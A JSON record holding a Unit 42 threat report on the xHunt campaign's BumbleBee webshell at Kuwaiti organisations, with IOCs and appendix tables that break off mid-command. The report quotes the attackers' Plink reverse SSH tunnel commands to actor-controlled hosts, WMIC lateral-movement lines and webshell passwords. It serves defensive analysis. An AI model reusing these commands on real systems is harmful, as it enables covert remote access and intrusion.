{
    "id": "1457ca44-4878-4574-8c2a-9a384d7a45c5",
    "created_at": "2023-01-12T15:09:49.278633Z",
    "updated_at": "2025-03-27T02:16:04.536125Z",
    "deleted_at": null,
    "sha1_hash": "ccb5d8080be69403833fa308907a2511a1a34334",
    "title": "2021-01-11 - xHunt Campaign- New BumbleBee Webshell and SSH Tunnels Used for Lateral Movement",
    "authors": "",
    "file_creation_date": "2022-08-18T03:54:35Z",
    "file_modification_date": "2022-08-18T03:54:35Z",
    "file_size": 2318918,
    "plain_text": "# xHunt Campaign: New BumbleBee Webshell and SSH Tunnels Used for Lateral Movement\n\n**[unit42.paloaltonetworks.com/bumblebee-webshell-xhunt-campaign/](https://unit42.paloaltonetworks.com/bumblebee-webshell-xhunt-campaign/)**\n\nRobert Falcone January 11, 2021\n\nBy [Robert Falcone](https://unit42.paloaltonetworks.com/author/robertfalcone/)\n\nJanuary 11, 2021 at 12:01 AM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit-42/)\n\nTags: [BumbleBee,](https://unit42.paloaltonetworks.com/tag/bumblebee/) [remote desktop,](https://unit42.paloaltonetworks.com/tag/remote-desktop/) [webshell,](https://unit42.paloaltonetworks.com/tag/webshell/) [xHunt](https://unit42.paloaltonetworks.com/tag/xhunt/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/bumblebee-webshell-xhunt-campaign/)\n\n## Executive Summary\n\nIn September 2020, we began investigating a Microsoft Exchange server at a Kuwaiti\norganization that a threat group compromised as part of a continued xHunt campaign. This\n[investigation resulted in the discovery of two new backdoors called TriFive and Snugy, which](https://unit42.paloaltonetworks.com/xhunt-campaign-backdoors/)\nwe discussed in a prior blog, as well as a new webshell that we call BumbleBee that we will\nexplain in greater detail in this blog. We use this name because the color scheme of the\nBumbleBee webshell includes white, black and yellow, as seen in Figure 1.\n\n\n-----\n\nThe actor used the BumbleBee webshell to upload and download files to and from the\ncompromised Exchange server, but more importantly, to run commands that the actor used to\ndiscover additional systems and to move laterally to other servers on the network. We found\nBumbleBee hosted on an internal Internet Information Services (IIS) web server on the same\nnetwork as the compromised Exchange server, as well as on two internal IIS web servers at\n[two other Kuwaiti organizations. As mentioned in our prior xHunt Campaign blog, we still do](https://unit42.paloaltonetworks.com/xhunt-campaign-backdoors/)\nnot know the initial infection vector used to compromise the Exchange server, as this appears\nto have occurred prior to the logs we were able to collect.\n\nWe observed the actor interacting directly with the BumbleBee webshell on the compromised\nExchange server of the Kuwaiti organization, as this server was accessible from the internet.\nThe actor used Virtual Private Networks (VPNs) provided by Private Internet Access when\ndirectly accessing BumbleBee on internet-accessible servers. The actor would frequently\nswitch between different VPN servers to change the external IP address of the activity that the\nserver would store in the logs. Specifically, the actor changed the IP address to appear to be\nfrom different countries, including Belgium, Germany, Ireland, Italy, Luxembourg, the\nNetherlands, Poland, Portugal, Sweden and the United Kingdom. We believe this is an attempt\nto evade detection and make analysis of the malicious activities more difficult. We also\nobserved the actor switching between different operating systems and browsers, specifically\nMozilla Firefox or Google Chrome on Windows 10, Windows 8.1 or Linux systems. This\nsuggests the actor has access to multiple systems and uses this to make analysis of the\nactivities more difficult, or that there are multiple actors involved, who have differing\npreferences for operating systems and browsers.\n\nIn addition to using VPNs, the actor used SSH tunnels to interact with BumbleBee webshells\nhosted on internal IIS web servers that are not accessible directly from the internet at all three\nKuwaiti organizations. The commands executed on the servers via BumbleBee suggest that\nthe actor used the PuTTY Link (Plink) tool to create SSH tunnels to access services internal to\nthe compromised network. We observed the actor using Plink to create an SSH tunnel for TCP\nport 3389, which suggests that the actor used the tunnel to access the system using Remote\nDesktop Protocol (RDP). We also observed the actor creating SSH tunnels to internal servers\nfor TCP port 80, which suggests the actor used the tunnel to access internal IIS web servers.\nWe believe that the actor accessed these additional internal IIS web servers to leverage file\nuploading functionality in internal web applications to install BumbleBee as a method of lateral\nmovement.\n\n[Palo Alto Networks Next-Generation Firewall customers are protected from these xHunt-](https://www.paloaltonetworks.com/network-security/next-generation-firewall)\nrelated attacks with [Threat Prevention,](https://www.paloaltonetworks.com/products/secure-the-network/subscriptions/threat-prevention) [URL Filtering and](https://www.paloaltonetworks.com/products/threat-detection-and-prevention/web-security) [DNS Security subscriptions.](https://www.paloaltonetworks.com/products/threat-detection-and-prevention/dns-security)\n\n## BumbleBee Webshell\n\nThe threat group involved in the xHunt campaign compromised an Exchange server at a\nKuwaiti organization and installed a webshell that we call BumbleBee. We call the webshell\nBumbleBee because the color scheme of the webshell includes white black and yellow as\n\n\n-----\n\nseen in Figure 1. BumbleBee is pretty straightforward. It allows an attacker to execute\ncommands and upload and download files to and from the server. The interesting part of\nBumbleBee is that it requires an actor to supply one password to view the webshell and a\nsecond password to interact with the webshell.\n\nFigure 1. BumbleBee webshell used by xHunt actor to run commands on Microsoft Exchange\nServer.\nTo view the BumbleBee webshell, the actor must provide a password in a URL parameter\nnamed parameter. Otherwise, the form used to interact with BumbleBee will not display in the\nbrowser. To check the supplied password for authentication, the webshell will generate an MD5\nhash of the parameter value and check it with a hardcoded MD5 hash, which in the\nBumbleBee sample hosted on the compromised Exchange server we observed was an MD5\nhash of 1B2F81BD2D39E60F1E1AD05DD3BF9F56 for the password string\nfkeYMvKUQlA5asR. Once displayed, BumbleBee provides the actor three main functionalities:\n\n1. Executing commands via cmd /c\n2. Uploading files to the server to a specified folder (c:\\windows\\temp by default).\n3. Download files from the server.\n\nTo carry out any of these functions, the actor must supply a second password (in the field with\nthe added “password” label in Figure 1). The BumbleBee webshell will generate an MD5 hash\nof the password and check it with a hardcoded MD5 hash before carrying out the functionality.\nThe MD5 hash checked prior to carrying out the actor’s desired actions was\n36252C6C2F616C5664A54058F33EF463, but we were unfortunately unable to determine the\nstring form of this password. While we did not know the password required to use\n\n\n-----\n\nBumbleBee s functionality, we were able to determine the commands executed via the\nwebshell by analyzing logs from the compromised Exchange server, which we will discuss in\ndetail in a later section of this blog.\n\nWhile carrying out our analysis, we found a second BumbleBee webshell that contained\ndifferent MD5 hashes for viewing the webshell and executing commands, which were\nA2B4D934D394B54672EA10CA8A65C198 and 28D968F26028D956E6F1199092A1C408,\nrespectively. We determined that the hash of A2B4D934D394B54672EA10CA8A65C198 was\nfor the password TshuYoOARg3fndI, but we were unable to determine the string for the second\nhash. This webshell was hosted at an internal IIS web server at the same Kuwaiti organization\nwhere the original BumbleBee was found on a compromised Exchange server. We also found\nthis specific BumbleBee sample hosted on internal IIS web servers at two other organizations\nin Kuwait. We were able to collect endpoint logs from an internal IIS web server at one of the\ntwo Kuwaiti organizations to determine the commands executed via BumbleBee, which we will\nalso discuss in a later section of this blog.\n\n## Interactions With Compromised Microsoft Exchange Server\n\nTo determine the actor’s activities regarding the compromised Exchange server of a Kuwaiti\norganization, we collected IIS server logs from the Exchange server and the logs generated for\nthe system by Cortex XDR. Within the IIS logs, we were able to observe the HTTP POST\nrequests generated when the actor issued commands via the BumbleBee webshell installed on\nthe compromised Exchange server. Using the IIS logs, we were also able to observe the actor\nlogging into a compromised email account via Outlook Web App and carrying out specific\nactivities once logged in, such as viewing emails and searching for other email accounts on the\ncompromised network.\n\nUnfortunately, the compromised Exchange server cannot log the data within the POST\nrequests, so while we know how many commands were issued from these logs, we do not\nknow the actual commands that the actor executed. Also, we were only able to collect 34 days’\nworth of logs from the period between Jan. 31, 2020, and Sept. 16, 2020, which did not include\nall the IIS logs from the compromised Exchange server. Due to these large gaps in logs, we do\nnot have a complete picture of the activity or even visibility into the beginning of the actor’s\ninteractions with the compromised Exchange server. For example, the IIS logs show the first\nBumbleBee webshell activity on Feb. 1, 2020, but they also show the TriFive backdoor logging\ninto a compromised email account every five minutes starting at 12:02 AM UTC on Jan. 31,\n2020. The TriFive beacons every five minutes suggest it was repeatedly running via the\n[scheduled task discussed in our previous blog on the backdoors related to this incident, which](https://unit42.paloaltonetworks.com/xhunt-campaign-backdoors/)\nalso suggests that the actor had already gained sustained access to the compromised\nExchange server before what our collected logs show.\n\nUsing the IIS logs we were able to collect from the compromised Exchange server, we were\nable to put together a timeline of the actor’s activity, including interactions with the BumbleBee\nwebshell On Feb 1 and July 27 2020 the actor logged into the Exchange server via Outlook\n\n\n-----\n\nWeb App using compromised credentials. The actor used the search functionality within\nOutlook Web App to search for email addresses, including searching for the domain name of\nthe compromised Kuwaiti organization to get a full list of email addresses, as well as specific\nkeywords, such as helpdesk. We also saw the actor viewing emails in the compromised\naccount’s inbox, specifically emails from service providers and technology vendors.\nAdditionally, the actor viewed alert emails from a Symantec product and Fortinet’s FortiWeb\nproduct. The act of searching for emails to the helpdesk and viewing security alert emails\nsuggests that the threat actor was interested in determining whether the Kuwaiti organization\nhad become aware of the malicious activities.\n\nIn regard to the BumbleBee webshell activity, the important pieces of information in the IIS logs\nused to generate a timeline were:\n\nTimestamp of the HTTP requests.\nActor’s IP address.\nUser-agent in HTTP request provides the actor’s operating system and browser version.\nClientId in the URL parameters is a unique identifier for the client provided by the\nExchange server via a server-side cookie.\n\nTable 1 in the Appendix provides the timeline of activity regarding the actor’s use of the\nBumbleBee webshell, which began on Feb. 1, 2020, according to the logs we were able to\ncollect. While creating this timeline, we noticed a few interesting observables and behaviors\nexhibited by the actor when interacting with BumbleBee, including:\n\nAll but one of the IP addresses used by the actor are associated with a VPN provided by\nPrivate Internet Access, with the other IP address belonging to FalcoVPN.\nThe actor switched between VPN servers in different locations to change IP address and\nto appear to originate from different countries, specifically Belgium, Germany, Ireland,\nItaly, Luxembourg, the Netherlands, Poland, Portugal, Sweden and the United Kingdom.\nThe actor used a combination of operating systems and browsers when interacting with\n\nBumbleBee, specifically FireFox ( ) or Chrome ( ) on Windows 10 ( ),\n\nWindows 8.1 ( ) or Linux systems ( ).\n\n## Commands Executed via BumbleBee\n\nAs we previously mentioned, the compromised Exchange server of a Kuwaiti organization\ndoes not log the POST data within the IIS logs, so we were unable to extract the commands\nrun on the BumbleBee webshell. However, we used overlapping timestamps to correlate the\nactivity in the IIS logs with the command prompt activity seen in Cortex XDR logs to determine\nthe commands executed on the server. Unfortunately, we did not have visibility into the\ncommands executed on BumbleBee until Sept. 16, 2020, when Cortex XDR was installed on\n\n\n-----\n\nthe compromised Exchange server in response to the suspicious activity. We were also able to\ndetermine the commands run on the BumbleBee webshell hosted on the internal IIS web\nserver at one of the two other Kuwaiti organizations as well.\n\nBased on the Cortex XDR logs, the actor spent three hours and 37 minutes on Sept. 16, 2020,\nrunning commands via the BumbleBee webshell installed on the compromised Exchange\nserver. Table 2 in the Appendix shows all the commands and the MITRE ATT&CK technique\nidentifiers that best describe the activities carried out. The commands show the actor:\n\n[1. Performing network discovery (T1018) using ping and net group commands, as well as](https://attack.mitre.org/techniques/T1018/)\n\n[PowerShell (T1059.001), to find additional computers on the network.](https://attack.mitre.org/techniques/T1059/001/)\n[2. Performing account discovery (T1087) using the whoami and quser commands.](https://attack.mitre.org/techniques/T1087/)\n[3. Determining the system time (T1124) using the W32tm and time commands.](https://attack.mitre.org/techniques/T1124/)\n[4. Creating an SSH tunnel (T1572) using Plink (RTQ.exe) to a remote host.](https://attack.mitre.org/techniques/T1572/)\n[5. Using RDP (T1021.001) over the SSH tunnel to control the compromised computer.](https://attack.mitre.org/techniques/T1021/001/)\n[6. Laterally moving (T1570) to another system by mounting a shared folder, copying Plink](https://attack.mitre.org/techniques/T1570/)\n\n(RTQ.exe) to a remote system and using Windows Management Instrumentation (WMI)\n[(T1047) to create an SSH tunnel for RDP access.](https://attack.mitre.org/techniques/T1047/)\n[7. Removing evidence of their presence by deleting (T1070.004) BumbleBee after they](https://attack.mitre.org/techniques/T1070/004/)\n\nwere done issuing commands.\n\nThe commands listed in Table 2 in the Appendix also show the actor using Plink (RTQ.exe) to\ncreate an SSH tunnel to an external IP address 192.119.110[.]194, as seen in the following\ncommand:\n\necho y | c:\\windows\\temp\\RTQ.exe 192.119.110[.]194 -C -R 0.0.0.0:8081:<redacted IP\n#2>:3389 -l bor -pw 123321 -P 443\n\nThe IP address overlaps with other related infrastructure that we will discuss in a later section\nof this blog. Most importantly, the username and password of bor and 123321 used to create\nthe SSH tunnel overlaps directly with prior xHunt activity. These exact credentials were listed\nwithin the [cheat sheet found within the Sakabota tool, which provided an example command](https://unit42.paloaltonetworks.com/xhunt-actors-cheat-sheet/)\nthat the actor could use to create SSH tunnels using Plink. We believe the actor used the\nexample command from the cheat sheet as a basis for the commands they used to create the\nSSH tunnels via BumbleBee.\n\nThe actor creates these SSH tunnels to connect to non-internet accessible RDP services on\nthe Windows system, specifically to use RDP to interact with the compromised system and to\nuse Graphical User Interface (GUI) applications. The actor also uses these SSH tunnels to\nmove laterally to other systems on the network, specifically to access internal systems that are\nnot remotely accessible from the internet, as depicted in Figure 2.\n\n\n-----\n\nFigure 2. Visualization of xHunt actor accessing an internal system from an SSH tunnel\ncreated on the internet accessible server hosting BumbleBee.\nIn addition to analyzing commands executed on the compromised Exchange server, we also\nanalyzed the commands executed on the BumbleBee webshell at an internal IIS web server\nhosted at one of the two other Kuwaiti organizations. On Sept. 10, 2020, we found that the\nactor ran several commands to perform network and user account discovery. Additionally, the\nactor used BumbleBee to upload a second webshell with a filename of cq.aspx. The actor used\nthis second webshell to run a PowerShell script that issued SQL queries to a Microsoft SQL\nServer database.\n\nThe actor first issued a SQL query to check the version of SQL server, followed by the actor\nissuing two additional queries that were very specific to the web application running on the IIS\nweb server. The PowerShell script used to issue the SQL queries is very similar to scripts that\n[were included in a Microsoft Technet forum post titled Running SQL via PowerShell, which](https://social.technet.microsoft.com/Forums/ie/en-US/603af83a-8db5-48ce-b19c-74a823ebbece/running-sql-via-powershell?forum=winserverpowershell)\nsuggests the actor may have used this forum post as a basis for the PowerShell script. We\nwere unable to obtain the second webshell, as the actor deleted it via the BumbleBee webshell\nwhen they were finished. Table 3 in the Appendix shows the commands executed via\nBumbleBee on Sept. 10, 2020.\n\nThe logs on the IIS web server hosting the BumbleBee webshell used to issue the commands\nin Table 3 only included internal IP addresses for the source of the activity. The internal IP\naddresses suggested this web server was not publicly accessible and did not expose the\nactor’s source IP address. However, all of the attempts to access BumbleBee and run the\ncommands in Table 3 had 192.119.110[.]194:8083 as the host in the URL of the referrer field\nwithin the web server logs. This external IP address in the referrer field suggests that the actor\nwas accessing BumbleBee via an SSH tunnel. The IP address in the referrer field is also the\nsame as in the command issued to create the SSH tunnels for RDP access that we observed\non the compromised Exchange server, as shown in Table 2.\n\n## File Uploader and SSH Tunnels\n\nDuring our research, we found a second BumbleBee webshell that was hosted on an internal\nIIS web server at the initial Kuwaiti organization, as well as on internal IIS web servers at two\nother Kuwaiti organizations. This BumbleBee webshell had different passwords to view and run\n\n\n-----\n\ncommands compared to the first sample we analyzed. The second BumbleBee webshell\nrequired the actor to include the password TshuYoOARg3fndI within a URL parameter aptly\nnamed parameter. As with the initial BumbleBee sample, we do not know the password the\nactor must include to be able to run commands on the webshell.\n\nBy analyzing artifacts on the internal IIS web server, we were able to determine that on July 16,\n2020, the actor ran similar commands to create SSH tunnels using Plink as those seen in\nTable 2 in the Appendix. We determined the actor executed commands that use the same\n[username and password as seen in the xHunt cheat sheet, but with a different external IP](https://unit42.paloaltonetworks.com/xhunt-actors-cheat-sheet/)\naddress controlled by the actor, as in the following:\n\n1.exe 142.11.211[.]79 -C -R 0.0.0.0:8080:10.x.x.x:80 -l bor -pw 123321 -P 443\n\nSVROOT.exe 142.11.211[.]79 -C -R 0.0.0.0:8081:10.x.x.x:80 -l bor -pw 123321 -P 443\n\nThese commands differ from those used to create the SSH tunnel on the compromised\nExchange server that allowed the actor to connect to the server using RDP over TCP port\n3389. The commands above attempt to create a tunnel to allow the actor to access web\nservers hosted at other internal servers over TCP port 80. We believe the actor used these\nSSH tunnels to gain access to web servers on other internal networks with hopes of finding\nsimilar file uploading functionality on those servers. If found, we believe the actor would use\nthe file uploading functionality to upload a webshell to compromise the remote server for lateral\nmovement.\n\nWe checked the IIS logs that contained BumbleBee webshell activity and found three external\nIP addresses within the URLs of the referrer field of inbound HTTP requests. The presence of\nthese IP addresses in the referrer field suggests that the actor used the SSH tunnels to access\nthe web servers by including the following IP and TCP ports in the URL field of their browser:\n\n142.11.211[.]79:8080\n\n142.11.211[.]79:8081\n\n91.92.109[.]59:1234\n\n91.92.109[.]59:1255\n\n91.92.109[.]59:1288\n\n91.92.109[.]59:1289\n\n192.119.110[.]194:8083\n\n## Related xHunt Infrastructure\n\n\n-----\n\nThe inbound requests to the BumbleBee webshell hosted on the compromised Exchange\nserver did not provide any decent pivot points to other xHunt infrastructure, as all the external\nIP addresses were of VPN servers the actor used when interacting with the webshell.\nFortunately, we were able to extract known xHunt infrastructure used as the remote servers for\nthe SSH tunnels that the actor created to access systems via RDP and internal web services.\nThe three external servers used for the SSH tunnels were 192.119.110[.]194, 142.11.211[.]79\nand 91.92.109[.]59, which provided overlaps with other infrastructure seen in the chart in\nFigure 3.\n\nFigure 3. Infrastructure associated with xHunt servers used for SSH tunnels.These three IP\naddresses used for the remote location of the SSH tunnel resolved to the domains\nns1.backendloop[.]online and ns2.backendloop[.]online. More recently, these two domains\nhave resolved to an IP address of 192.255.166[.]158, which may suggest that the actor is\nusing a server at this IP address in current operations. The 91.92.109[.]59 IP address also\n\n\n-----\n\nresolved to various subdomains on the following domains, suggesting that they are also part of\nthe actor’s infrastructure:\nbackendloop[.]online\n\nbestmg[.]info\n\nwindowsmicrosofte[.]online\n\nThe domain windowsmicrosofte[.]online contains the substring microsofte, which was seen in\nthe Hisoka C2 domain of microsofte-update[.]com as mentioned in our initial publication on\nxHunt’s attacks on Kuwaiti shipping and transportation organizations. Unfortunately, we have\nnot seen any of these domains used by the actor within our telemetry, so we cannot determine\ntheir purpose within the actor’s operations.\n\n## Conclusion\n\nThe xHunt campaign continues as the actor installed a webshell we call BumbleBee on a\ncompromised Exchange server of a Kuwaiti organization, which we found hosted on an internal\nIIS web server on the same network. We also discovered BumbleBee on two internal IIS web\nservers at two other Kuwaiti organizations as well. While we know the actor used the file\nuploading functionality of a web application to install BumbleBee onto internal IIS web servers,\nwe are still unsure if the actor installed BumbleBee on the compromised Exchange server by\nexploiting a vulnerability or by moving laterally from another system on the network.\n\nThe actor used BumbleBee to run commands on the compromised servers at the three Kuwaiti\norganizations, including commands to discover user accounts and other systems on the\nnetwork, as well as commands to move laterally to other systems on the network. Additionally,\nthe actor created SSH tunnels to access systems via RDP and to access internal web servers\nfrom external servers controlled by the actor. The actor used the same username and\npassword for the SSH tunnels that we observed within the cheat sheet included in the\nSakabota tool, which was developed and exclusively used by the actor.\n\nThe external servers used by the actor for the SSH tunnels were seen in activity at two of the\nthree Kuwaiti organizations, which suggests this actor reuses infrastructure when interacting\nwith multiple target networks. These external servers also resolved to several related domains,\nsuggesting that they are not only used to establish SSH tunnels, but used more generally for\ninfrastructure across other portions of their operations.\n\nFrom this analysis, we determined that the actor prefers to use VPNs provided by Private\nInternet Access when interacting directly with the targeted networks to conceal their true\nlocation. The actor would also switch VPN servers often while issuing commands on the\nwebshell to make the activity appear to originate in many different countries. The actors also\nused a VPN when logging into compromised email accounts on the Exchange server of the\nKuwaiti organization, in which they specifically looked for helpdesk-related emails and emails\ngenerated by security alerts. The attempts to conceal their location and the focus on viewing\n\n\n-----\n\nemails that might notify administrators of the compromised network of the attacker s presence\nmay explain how the actor was able to maintain a presence on the compromised network for\nmany months.\n\nPalo Alto Networks Next-Generation Firewall customers are protected from the attacks outlined\nin this blog with the following security subscriptions:\n\nThreat Prevention signatures “BumbleBee Webshell File Detection” and “BumbleBee\nWebshell Command and Control Traffic Detection” detects BumbleBee webshell activity.\nActor’s related infrastructure has been categorized as malicious in URL Filtering and\nDNS Security.\n\n## Additional Resources\n\n Appendix\n\n**Indicators of Compromise**\n\n142.11.211[.]79\n\n91.92.109[.]59\n\n192.119.110[.]194\n\n192.255.166[.]158\n\nbackendloop[.]online\n\nbestmg[.]info\n\nwindowsmicrosofte[.]online\n\n**BumbleBee Webshell Activity on Exchange Server**\n\n\n**Start**\n**Time**\n\n**(UTC)**\n\n2/1/20\n10:47\n\n2/1/20\n11:37\n\n2/1/20\n12:38\n\n\n**Commands** **IP Address** **Client ID** **OS and**\n**Browser**\n**from**\n**User**\n**Agent**\n\n0 77.243.191[.]20 POQSBWBKAHZLRWNZFVPG\n\n12 185.220.70[.]144 RCWIWFL0MCDGZKGO0A\n\n0 193.176.86[.]134 RCWIWFL0MCDGZKGO0A\n\n\n-----\n\n2/1/20\n12:58\n\n6/28/20\n11:09\n\n7/25/20\n7:56\n\n7/25/20\n10:44\n\n7/25/20\n13:59\n\n7/26/20\n6:43\n\n7/26/20\n7:41\n\n7/26/20\n11:26\n\n7/27/20\n4:52\n\n7/27/20\n10:31\n\n9/6/20\n10:58\n\n\n75 82.102.21[.]219 NCHOOJMDGUYAOWZVXJQDG\n\n3 89.26.241[.]70 ITKVJLNUKULNR0PBAWQ\n\n0 23.92.127[.]18 IJFHUUAID0FGS9YQEMHCG\n\n15 196.52.84[.]35 IJAJGSWXUWVDVMMUHQQ\n\n7 196.52.84[.]52 IJAJGSWXUWVDVMMUHQQ\n\n3 185.220.70[.]139 IJAJGSWXUWVDVMMUHQQ\n\n4 185.230.127[.]233 IJAJGSWXUWVDVMMUHQQ\n\n5 185.230.127[.]239 IJAJGSWXUWVDVMMUHQQ\n\n1 193.176.86[.]170 IJAJGSWXUWVDVMMUHQQ\n\n3 212.102.52[.]134 IJAJGSWXUWVDVMMUHQQ\n\n0 212.102.35[.]102 IIARASUWFCYUBMI0NA\n\n\n-----\n\n9/8/20\n6:37\n\n9/8/20\n8:22\n\n9/8/20\n8:48\n\n9/8/20\n11:40\n\n9/8/20\n13:31\n\n9/9/20\n5:57\n\n9/10/20\n18:58\n\n9/12/20\n7:13\n\n9/12/20\n10:29\n\n9/15/20\n0:04\n\n9/15/20\n5:28\n\n\n24 196.52.84[.]30 QAFCNW0FN0ENKWGZPEPVW\n\n0 185.230.127[.]238 HKPBNWFKIYLNWUGAHJA\n\n0 185.230.127[.]238 <several unique>\n\n9 185.230.127[.]238 QAFCNW0FN0ENKWGZPEPVW\n\n1 212.102.52[.]134 QAFCNW0FN0ENKWGZPEPVW\n\n3 89.238.139[.]52 QAFCNW0FN0ENKWGZPEPVW\n\n24 195.181.170[.]242 QAFCNW0FN0ENKWGZPEPVW\n\n26 89.238.137[.]37 QAFCNW0FN0ENKWGZPEPVW\n\n2 212.102.52[.]134 QAFCNW0FN0ENKWGZPEPVW\n\n7 92.223.89[.]137 QAFCNW0FN0ENKWGZPEPVW\n\n2 85.203.46[.]99 OWITUR9UOKSZPXDKFBW\n\n\n-----\n\n9/15/20\n10:45\n\n9/15/20\n11:24\n\n9/15/20\n13:24\n\n9/15/20\n13:30\n\n9/15/20\n14:49\n\n9/15/20\n15:13\n\n9/15/20\n15:17\n\n9/15/20\n15:17\n\n9/15/20\n15:17\n\n9/15/20\n15:24\n\n9/15/20\n15:24\n\n\n5 185.246.208[.]197 YEHIZAWKCLYFMDS9Q\n\n1 77.243.191[.]20 VOICHQVTFKIDXTCAKA\n\n4 92.223.89[.]134 QAFCNW0FN0ENKWGZPEPVW\n\n6 185.246.208[.]197 YEHIZAWKCLYFMDS9Q\n\n3 92.223.89[.]136 QAFCNW0FN0ENKWGZPEPVW\n\n3 89.238.139[.]52 QAFCNW0FN0ENKWGZPEPVW\n\n1 195.181.170[.]243 QAFCNW0FN0ENKWGZPEPVW\n\n1 89.238.139[.]52 QAFCNW0FN0ENKWGZPEPVW\n\n7 195.181.170[.]243 QAFCNW0FN0ENKWGZPEPVW\n\n3 89.238.139[.]52 QAFCNW0FN0ENKWGZPEPVW\n\n1 195.181.170[.]243 QAFCNW0FN0ENKWGZPEPVW\n\n\n-----\n\n9/16/20\n5:32\n\n9/16/20\n13:42\n\n9/16/20\n14:33\n\n9/16/20\n14:34\n\n9/16/20\n15:44\n\n9/16/20\n16:15\n\n9/16/20\n16:17\n\n9/16/20\n17:21\n\n\n56 YEHIZAWKCLYFMDS9Q\n84.17.55[.]68\n\n6 46.246.3[.]254 INAYIKTWB0WGQOW0SRHWAQ\n\n0 46.246.3[.]254 QAFCNW0FN0ENKWGZPEPVW\n\n9 46.246.3[.]254 INAYIKTWB0WGQOW0SRHWAQ\n\n52 46.246.3[.]253 QAFCNW0FN0ENKWGZPEPVW\n\n2 46.246.3[.]254 INAYIKTWB0WGQOW0SRHWAQ\n\n13 46.246.3[.]253 QAFCNW0FN0ENKWGZPEPVW\n\n1 46.246.3[.]254 QAFCNW0FN0ENKWGZPEPVW\n\n\n_Table 1. Actor activity using BumbleBee webshell on compromised Exchange server._\n\n**Commands Executed via BumbleBee on Exchange Server**\n\n\n**Time**\n**(UTC) on**\n**9/16/2020**\n\n\n**Command Executed** **ATT&CK**\n**IDs**\n\n\n13:42:12 ping -n 1 -a <redacted IP #1> [T1018](https://attack.mitre.org/techniques/T1018/)\n\n13:42:27 quser /server:dc.<redacted root domain> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n14:27:39 ipconfig /all [T1016](https://attack.mitre.org/techniques/T1016/)\n\n14:27:51 W32tm /query /computer:<redacted IP #1> /configuration [T1124](https://attack.mitre.org/techniques/T1124/)\n\n\n-----\n\n14:29:06 W32tm /query /computer:<redacted IP #1> /configuration [T1124](https://attack.mitre.org/techniques/T1124/)\n\n14:34:25 quser /server:<redacted IP #1> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n\n14:36:57 echo y | echo q | echo y | echo q | echo y | echo q |echo y | echo q\n| echo y | echo q | echo y | echo q | time\n\n14:37:11 echo y | echo q | echo y | echo q | echo y | echo q |echo y | echo q\n| echo y | echo q | echo y | echo q | time\n\n\n[T1124](https://attack.mitre.org/techniques/T1124/)\n\n[T1124](https://attack.mitre.org/techniques/T1124/)\n\n\n14:43:34 quser /server:<redacted IP #1> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n14:43:53 quser /server:<redacted IP #2> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n14:49:14 quser /server:<redacted IP #1> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n14:49:33 quser <redacted username #1> /server:<redacted hostname #1> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n15:43:13 ipconfig /all [T1016](https://attack.mitre.org/techniques/T1016/)\n\n15:43:21 quser /server:<redacted IP #1> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n15:44:53 dir c:\\windows\\temp\\*.exe [T1083](https://attack.mitre.org/techniques/T1083/)\n\n\n15:45:15 echo y | c:\\windows\\temp\\RTQ.exe 192.119.110[.]194 -C -R\n0.0.0.0:8081:<redacted IP #2>:3389 -l bor -pw 123321 -P 443\n\n\n[T1572,](https://attack.mitre.org/techniques/T1572/)\n[T1021.001](https://attack.mitre.org/techniques/T1021/001/)\n\n\n15:45:26 whoami [T1033](https://attack.mitre.org/techniques/T1033/)\n\n\n15:45:32 echo y | c:\\windows\\temp\\RTQ.exe 192.119.110[.]194 -C -R\n0.0.0.0:8081:<redacted IP #2>:3389 -l bor -pw 123321 -P 443\n\n\n[T1572,](https://attack.mitre.org/techniques/T1572/)\n[T1021.001](https://attack.mitre.org/techniques/T1021/001/)\n\n\n15:46:11 c:\\windows\\temp\\RTQ.exe [T1059.003](https://attack.mitre.org/techniques/T1059/003/)\n\n15:46:21 whoami /priv [T1033](https://attack.mitre.org/techniques/T1033/)\n\n15:48:15 net group \"Domain Computers\" /domain [T1069](https://attack.mitre.org/techniques/T1069/)\n\n15:48:35 ping -n 1 <redacted hostname #2> [T1018](https://attack.mitre.org/techniques/T1018/)\n\n\n15:49:30 net use \\<redacted IP #3>\\C$ /user:<redacted domain>\\<redacted\nusername #2> <redacted password #1>\n\n15:50:22 copy c:\\windows\\temp\\RTQ.exe \\<redacted IP\n#3>\\C$\\windows\\temp\\RTQ.exe\n\n\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n[T1560,](https://attack.mitre.org/techniques/T1570/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n15:50:28 \\<redacted IP #3>\\C$\\windows\\temp\\RTQ.exe [T1059.003,](https://attack.mitre.org/techniques/T1059/003/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n15:51:59 wmic /node:\"<redacted IP #3>\" /user:<redacted domain>\\\n<redacted username #2> /PASSWORD:<redacted password #1>\nprocess call create \"cmd.exe /c c:\\windows\\temp\\RTQ.exe >>\nC:\\windows\\temp\\r.txt\"\n\n\n[T1047](https://attack.mitre.org/techniques/T1047/)\n\n\n-----\n\n15:52:22 type \\<redacted IP #3>\\C$\\windows\\temp\\r.txt [T1039,](https://attack.mitre.org/techniques/T1039/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n15:53:36 wmic /node:\"<redacted IP #3>\" /user:<redacted domain>\\\n<redacted username #2> /PASSWORD:<redacted password #1>\nprocess call create \"cmd.exe /c c:\\windows\\temp\\RTQ.exe\n192.119.110[.]194 -C -R 0.0.0.0:8082:<redacted IP #2>:3389 -l bor\n-pw 123321 -P 443\"\n\n15:55:14 wmic /node:\"<redacted IP #3>\" /user:<redacted domain>\\\n<redacted username #2> /PASSWORD:<redacted password #1>\nprocess call create \"cmd.exe /c c:\\windows\\temp\\RTQ.exe\n192.119.110[.]194 -C -R 0.0.0.0:8084:0.0.0.0:3389 -l bor -pw\n123321 -P 